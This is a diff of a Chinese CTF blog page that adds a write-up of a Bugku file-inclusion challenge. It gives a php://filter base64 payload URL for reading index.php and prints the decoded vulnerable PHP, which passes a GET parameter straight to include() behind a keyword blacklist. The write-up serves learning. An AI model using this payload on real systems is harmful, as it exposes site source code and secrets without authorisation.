@@ -107,7 +107,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/webvim5.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/webweizao1.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/webweizao2.PNG">
-<meta property="og:updated_time" content="2017-09-27T14:32:49.752Z">
+<meta property="og:updated_time" content="2017-10-02T13:14:19.296Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="少许基础web题目">
 <meta name="twitter:description" content="vim不正常退出">
@@ -397,6 +397,13 @@
 <h4 id="补一个相关知识点"><a href="#补一个相关知识点" class="headerlink" title="补一个相关知识点"></a>补一个相关知识点</h4><p>Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)<br>表示的含义为 </p>
 <p>Mozilla/5.0  一种浏览器的名称<br>compatible 适合的;兼用的<br>MSIE8.0 微软公司出品的IE浏览器8.0版本<br>Windows NT 5.1 微软公司出品的服务器操作系统(xp)<br>SV1=Security Version 1 安全版本1</p>
 <h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>为什么IE浏览器的UA也是“Mozilla/4.0”打头的呢？<br>第一轮浏览器大战最后以Netscape被收购，Internet Explorer独霸浏览器市场告终。而此时Mozilla的历史正是由这里开始。浏览器之战失利以后，Netscape并没有消失，为了挽回市场，1998年Netscape将浏览器的大部分代码开源，成立了一个组织，计划开发下一代的 Netscape浏览器，这个组织就是Mozilla.org，它的图标是一只恐龙。不久后，Netscape的源代码就差不多被全部抛弃， Mozilla社团开发出了在稳定性和功能上更出色的新一代浏览器。这个浏览器就是Mozilla Application Suite，简称Mozilla（Mozilla这个名字的来源是Mosaic和Godzilla（怪兽哥斯拉）两个词的结合，意为 “Mosaic终结者”。 起初，Mozilla是Netscape的吉祥物，也是Netscape Navigator浏览器使用的内部开发代号。由于Netscape早期的影响力，直到今天，所有浏览器包括IE，向Web服务器报告自己的浏览器标识的时候，都以 “Mozilla”开头，表明自己是Mozilla兼容的。</p>
+<h3 id="file-远程文件包含漏洞"><a href="#file-远程文件包含漏洞" class="headerlink" title="file 远程文件包含漏洞"></a>file 远程文件包含漏洞</h3><p>发现链接<a href="http://120.24.86.145:8005/post/index.php?file=show.php" target="_blank" rel="external">http://120.24.86.145:8005/post/index.php?file=show.php</a></p>
+<p>发现File参数 想到文件包含漏洞 故尝试读取php源码</p>
+<p>并且题目提示flag在index里 故读取index.php</p>
+<p>PAYLOAD:<br><a href="http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="external">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a><br>利用base64可以进行不可打印字符的读取</p>
+<p>拿到base64加密的源码 再进行解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</div><div class="line">    </div><div class="line">&lt;?php</div><div class="line">	error_reporting(0);</div><div class="line">	<span class="keyword">if</span>(!<span class="variable">$_GET</span>[file])&#123;<span class="built_in">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</div><div class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">"../"</span>)||stristr(<span class="variable">$file</span>, <span class="string">"tp"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"input"</span>)||stristr(<span class="variable">$file</span>,<span class="string">"data"</span>))&#123;</div><div class="line">		<span class="built_in">echo</span> <span class="string">"Oh no!"</span>;</div><div class="line">		<span class="built_in">exit</span>();</div><div class="line">	&#125;</div><div class="line">	include(<span class="variable">$file</span>); </div><div class="line">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</div><div class="line">?&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>看到了flag</p>
 
       
     </div>
@@ -597,7 +604,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#vim不正常退出"><span class="nav-number">1.</span> <span class="nav-text">vim不正常退出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#伪造登陆地址"><span class="nav-number">2.</span> <span class="nav-text">伪造登陆地址</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#补一个相关知识点"><span class="nav-number">2.1.</span> <span class="nav-text">补一个相关知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题外话"><span class="nav-number">2.2.</span> <span class="nav-text">题外话</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#vim不正常退出"><span class="nav-number">1.</span> <span class="nav-text">vim不正常退出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#伪造登陆地址"><span class="nav-number">2.</span> <span class="nav-text">伪造登陆地址</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#补一个相关知识点"><span class="nav-number">2.1.</span> <span class="nav-text">补一个相关知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题外话"><span class="nav-number">2.2.</span> <span class="nav-text">题外话</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file-远程文件包含漏洞"><span class="nav-number">3.</span> <span class="nav-text">file 远程文件包含漏洞</span></a></li></ol></div>
             
 
           </div>
